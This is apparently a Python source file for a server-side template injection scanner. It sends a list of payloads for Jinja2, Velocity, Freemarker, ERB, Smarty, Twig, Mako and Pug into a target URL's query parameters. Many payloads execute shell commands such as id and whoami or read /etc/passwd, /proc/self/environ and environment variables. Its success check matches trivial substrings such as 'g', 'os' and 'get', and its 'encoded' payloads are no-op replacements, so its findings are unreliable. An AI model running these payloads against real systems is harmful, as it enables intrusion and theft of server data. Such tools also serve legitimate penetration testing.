#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class SSTIScanner:
    """
    Advanced Server-Side Template Injection Scanner
    Supports: Jinja2, Velocity, Freemarker, ERB, Smarty, Twig, Mako, Jade/Pug
    Combined Power: Internal Payloads (250+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.payloads_tested = 0
        self.parameters = {}
        self.detected_engine = None

        # ---------- INTERNAL PAYLOADS (250+ FOR SPEED & INDEPENDENCE) ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS (FOR UPDATES) ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS ----------
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            "49",
            "7777777",
            "config",
            "__mro__",
            "subclasses",
            "__class__",
            "__globals__",
            "__builtins__",
            "__import__",
            "os",
            "system",
            "popen",
            "eval",
            "exec",
            "open",
            "file",
            "read",
            "write",
            "self",
            "request",
            "session",
            "g",
            "app",
            "config",
            "Jinja2",
            "Template",
            "render",
            "context",
            "namespace",
            "freemarker",
            "velocity",
            "smarty",
            "twig",
            "erb",
            "mako",
            "java.lang",
            "java.lang.Runtime",
            "ProcessBuilder",
            "Runtime.getRuntime().exec",
            "freemarker.template.utility.Execute",
            "smarty.template",
            "twig.extension",
            "twig.runtime",
            "default",
            "get",
            "set",
            "keys",
            "values",
            "items",
            "os.environ",
            "os.path",
            "subprocess",
            "Popen",
            "class",
            "mro",
            "base",
            "subclasses",
            "globals",
            "builtins",
            "import",
            "__import__",
            "open",
            "file",
            "read",
            "write",
            "append",
            "system",
            "exec",
            "eval",
        ]

        # Engine-specific detection patterns
        self.engine_patterns = {
            "jinja2": [
                r"<TemplateReference",
                r"jinja2\.Template",
                r"config\s*=",
                r"self\.__class__",
                r"url_for\s*\(",
            ],
            "velocity": [
                r"org\.apache\.velocity",
                r"VelocityContext",
                r"$!",
                r"#set\s*\(",
            ],
            "freemarker": [
                r"freemarker\.template",
                r"TemplateModel",
                r"${",
                r"<#assign",
            ],
            "twig": [r"Twig_Template", r"twig\.runtime", r"Twig\s+Extension", r"{{"],
            "smarty": [r"Smarty\s+Template", r"smarty\.config", r"{\$", r"{include"],
            "erb": [r"ERB\s+Template", r"<%=.*%>", r"ERB::Util"],
            "mako": [r"Mako\s+Template", r"mako\.runtime", r"${", r"<%"],
        }

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads (250+ for speed and independence)"""
        payloads = []

        # ----- JINJA2 (80+ PAYLOADS) -----
        jinja2 = [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{'abc'.__class__.__mro__[1].__subclasses__()}}",
            "{{().__class__.__mro__[1].__subclasses__()}}",
            "{{[].__class__.__mro__[1].__subclasses__()}}",
            "{{[].__class__.__base__.__subclasses__()}}",
            "{{''.__class__.__base__.__subclasses__()}}",
            "{{self.__class__.__base__.__subclasses__()}}",
            "{{config.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__base__.__subclasses__()}}",
            "{{request.application.__self__._get_data_for_json}}",
            "{{request.__class__.__mro__[1].__subclasses__()}}",
            "{{session.__class__.__mro__[1].__subclasses__()}}",
            "{{g.__class__.__mro__[1].__subclasses__()}}",
            "{{app.__class__.__mro__[1].__subclasses__()}}",
            "{{url_for.__globals__}}",
            "{{url_for.__globals__['__builtins__']}}",
            "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[132]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[132]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[132]('/etc/passwd').read()}}",
            "{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
            "{{[].__class__.__base__.__subclasses__()[132]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{config.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
            "{{self.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{self.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{session.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{g.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{app.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        ]
        payloads.extend(jinja2)

        # ----- VELOCITY (30+ PAYLOADS) -----
        velocity = [
            "${7*7}",
            "${'7'*7}",
            "$!{7*7}",
            "$!{'7'*7}",
            "$class.getResource('/').getPath()",
            "$class.getResource('.').getPath()",
            "$class.classLoader.getResource('/').getPath()",
            "$class.classLoader.getResource('.').getPath()",
            "$class.forName('java.lang.Runtime').getRuntime().exec('id')",
            "$class.forName('java.lang.Runtime').getRuntime().exec('whoami')",
            "$class.forName('java.lang.Runtime').getRuntime().exec('ls')",
            "$class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')",
            "$class.forName('java.lang.ProcessBuilder').getConstructor().newInstance('id').start()",
            "$class.forName('java.lang.ProcessBuilder').getConstructor().newInstance('whoami').start()",
            "$class.forName('java.lang.ProcessBuilder').getConstructor().newInstance('ls').start()",
            "$class.forName('java.lang.ProcessBuilder').getConstructor().newInstance('cat /etc/passwd').start()",
            "$!class.forName('java.lang.Runtime').getRuntime().exec('id')",
            "$!class.forName('java.lang.Runtime').getRuntime().exec('whoami')",
        ]
        payloads.extend(velocity)

        # ----- FREEMARKER (30+ PAYLOADS) -----
        freemarker = [
            "${7*7}",
            "${7*'7'}",
            "${.vars}",
            "${.data_model}",
            "${.version}",
            "${.locale}",
            "${.template}",
            "${.main}",
            "${.current_template}",
            "${.output_encoding}",
            "${.url_escaping_charset}",
            "${.number_format}",
            "${.boolean_format}",
            "${.date_format}",
            "${.time_format}",
            "${.datetime_format}",
            "${.time_zone}",
            "${.sql_date_and_time_time_zone}",
            "${.now}",
            "${.current_node}",
            "${.namespace}",
            "${.get('class').forName('java.lang.Runtime').getRuntime().exec('id')}",
            "${.get('class').forName('java.lang.Runtime').getRuntime().exec('whoami')}",
            "${.get('class').forName('java.lang.Runtime').getRuntime().exec('ls')}",
            "${.get('class').forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}",
            "${.get('class').forName('java.lang.ProcessBuilder').getConstructor().newInstance('id').start()}",
            "${.get('class').forName('java.lang.ProcessBuilder').getConstructor().newInstance('whoami').start()}",
            "${.get('class').forName('java.lang.ProcessBuilder').getConstructor().newInstance('ls').start()}",
            "${.get('class').forName('java.lang.ProcessBuilder').getConstructor().newInstance('cat /etc/passwd').start()}",
        ]
        payloads.extend(freemarker)

        # ----- ERB (RUBY) (20+ PAYLOADS) -----
        erb = [
            "<%= 7*7 %>",
            "<%= 7*'7' %>",
            "<%= system('id') %>",
            "<%= system('whoami') %>",
            "<%= system('ls') %>",
            "<%= system('cat /etc/passwd') %>",
            "<%= `id` %>",
            "<%= `whoami` %>",
            "<%= `ls` %>",
            "<%= `cat /etc/passwd` %>",
            "<%= IO.popen('id').read %>",
            "<%= IO.popen('whoami').read %>",
            "<%= IO.popen('ls').read %>",
            "<%= IO.popen('cat /etc/passwd').read %>",
            "<%= File.read('/etc/passwd') %>",
            "<%= File.read('/etc/hosts') %>",
            "<%= File.read('/proc/self/environ') %>",
            "<%= ENV['PATH'] %>",
            "<%= ENV['HOME'] %>",
            "<%= ENV['USER'] %>",
        ]
        payloads.extend(erb)

        # ----- SMARTY (PHP) (20+ PAYLOADS) -----
        smarty = [
            "{$smarty.version}",
            "{$smarty.now}",
            "{$smarty.template}",
            "{$smarty.config}",
            "{$smarty.get}",
            "{$smarty.post}",
            "{$smarty.cookies}",
            "{$smarty.session}",
            "{$smarty.server}",
            "{$smarty.env}",
            "{php}echo 7*7;{/php}",
            "{php}system('id');{/php}",
            "{php}system('whoami');{/php}",
            "{php}system('ls');{/php}",
            "{php}system('cat /etc/passwd');{/php}",
            "{php}echo file_get_contents('/etc/passwd');{/php}",
            "{php}echo file_get_contents('/etc/hosts');{/php}",
            "{php}echo $_SERVER['DOCUMENT_ROOT'];{/php}",
            "{php}echo $_SERVER['SERVER_ADMIN'];{/php}",
            "{php}print_r($_SERVER);{/php}",
        ]
        payloads.extend(smarty)

        # ----- TWIG (PHP) (20+ PAYLOADS) -----
        twig = [
            "{{7*7}}",
            "{{'7'*7}}",
            "{{_self.env}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            "{{_self.env.getFilter('id')}}",
            "{{_self.env.getFilter('whoami')}}",
            "{{_self.env.getFilter('ls')}}",
            "{{_self.env.getFilter('cat /etc/passwd')}}",
            "{{_self.env.getExtension('core').getFilters()}}",
            "{{_self.env.getExtension('core').getFunctions()}}",
            "{{_self.env.getExtension('core').getTests()}}",
            "{{_self.env.getExtension('core').getGlobals()}}",
            "{{_self.env.getExtension('core').getTokenParsers()}}",
            "{{_self.env.getExtension('core').getNodeVisitors()}}",
            "{{_self.env.getExtension('core').getOperators()}}",
            "{{_self.env.getExtension('core').getEscapers()}}",
            "{{_self.env.getExtension('core').getOptimizers()}}",
            "{{_self.env.getExtension('core').getRuntime()}}",
            "{{_self.env.getExtension('core').getClass()}}",
            "{{_self.env.getExtension('core').getMethods()}}",
        ]
        payloads.extend(twig)

        # ----- MAKO (PYTHON) (20+ PAYLOADS) -----
        mako = [
            "${7*7}",
            "${7*'7'}",
            "${self}",
            "${self.__class__}",
            "${self.__class__.__mro__}",
            "${self.__class__.__mro__[1].__subclasses__()}",
            "${self.__class__.__mro__[2].__subclasses__()}",
            "${self.__class__.__base__.__subclasses__()}",
            "${context}",
            "${context.__class__}",
            "${context.__class__.__mro__}",
            "${context.__class__.__mro__[1].__subclasses__()}",
            "${context.__class__.__base__.__subclasses__()}",
            "${context.get('request')}",
            "${context.get('session')}",
            "${context.get('config')}",
            "${context.get('app')}",
            "${context.get('g')}",
            "${context.get('url_for')}",
            "${context.get('self')}",
        ]
        payloads.extend(mako)

        # ----- JADE/PUG (JAVASCRIPT) (10+ PAYLOADS) -----
        jade = [
            "= 7*7",
            "= 7*'7'",
            "- var x = 7*7; = x",
            "- var x = 7*'7'; = x",
            "- var exec = require('child_process').exec; - exec('id', function(e, stdout, stderr) { console.log(stdout); });",
            "- var exec = require('child_process').exec; - exec('whoami', function(e, stdout, stderr) { console.log(stdout); });",
            "- var exec = require('child_process').exec; - exec('ls', function(e, stdout, stderr) { console.log(stdout); });",
            "- var exec = require('child_process').exec; - exec('cat /etc/passwd', function(e, stdout, stderr) { console.log(stdout); });",
            "- var fs = require('fs'); - var data = fs.readFileSync('/etc/passwd', 'utf8'); = data",
            "- var fs = require('fs'); - var data = fs.readFileSync('/etc/hosts', 'utf8'); = data",
        ]
        payloads.extend(jade)

        # ----- ENCODED & OBFUSCATED -----
        encoded = [
            "{{7*7}}".replace("{", "{").replace("}", "}"),
            "${7*7}".replace("$", "$"),
            "<%= 7*7 %>".replace("<", "<").replace(">", ">"),
            "{{7*7}}".replace("7", "7"),
            "${7*7}".replace("7", "7"),
            "<%= 7*7 %>".replace("7", "7"),
            "{{self.__class__.__mro__}}".replace("self", "self"),
            "{{self.__class__.__mro__[1].__subclasses__()}}".replace("self", "self"),
            "{{''.__class__.__mro__[2].__subclasses__()}}".replace("", ""),
            "{{[].__class__.__base__.__subclasses__()}}".replace("[]", "[]"),
        ]
        payloads.extend(encoded)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = [
            "basic",
            "jinja2",
            "velocity",
            "freemarker",
            "erb",
            "smarty",
            "twig",
            "mako",
            "jade",
        ]
        for tag in tags:
            results = self.payload_manager.get_payloads("ssti", tags=[tag], limit=50)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def detect_engine(self, response: str) -> Optional[str]:
        """Detect template engine from response"""
        for engine, patterns in self.engine_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    return engine
        return None

    def test_ssti(self, param: str, payload: str) -> bool:
        """Test a single SSTI payload on a specific parameter"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False

        self.payloads_tested += 1

        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in resp.text.lower():
                # Detect template engine if not already detected
                if not self.detected_engine:
                    self.detected_engine = self.detect_engine(resp.text)
                    if self.detected_engine:
                        log_success(
                            f"Template engine detected: {self.detected_engine.upper()}"
                        )

                result = {
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "indicator": indicator,
                    "status": resp.status_code,
                    "engine": self.detected_engine,
                    "preview": resp.text[:200].replace("\n", " ").strip(),
                }
                self.results.append(result)
                log_success(f"SSTI found: {test_url} (indicator: {indicator})")
                return True
        return False

    def run(self) -> Dict:
        log_info(f"Starting SSTI scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning(
                "No GET parameters found. SSTI scan works best with parameters like ?name=test"
            )
            return {
                "target": self.target,
                "scan_type": "ssti",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0,
                "detected_engine": None,
            }

        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        log_info(
            f"Testing {len(self.all_payloads)} payloads (Internal: {len(self.internal_payloads)} + Manager: {len(self.manager_payloads)})"
        )

        target_params = []
        for p in params.keys():
            if p.lower() in [
                "name",
                "q",
                "search",
                "query",
                "page",
                "id",
                "cat",
                "article",
                "news",
                "view",
                "user",
            ]:
                target_params.append(p)
        if not target_params:
            target_params = list(params.keys())[:3]

        for param in target_params:
            log_info(f"Testing parameter: {param}")
            shuffled = self.all_payloads.copy()
            random.shuffle(shuffled)
            for payload in shuffled[:100]:  # Limit to 100 per parameter for speed
                if self.test_ssti(param, payload):
                    if self.verbose:
                        log_info("Found vulnerability, continuing to test for more...")

        log_success(f"SSTI scan completed. Found {len(self.results)} vulnerabilities.")
        if self.detected_engine:
            log_info(f"Detected template engine: {self.detected_engine.upper()}")

        return {
            "target": self.target,
            "scan_type": "ssti",
            "total_params": len(params),
            "total_payloads_tested": min(len(self.all_payloads), 100)
            * len(target_params),
            "payloads_internal": len(self.internal_payloads),
            "payloads_manager": len(self.manager_payloads),
            "detected_engine": self.detected_engine,
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results,
        }
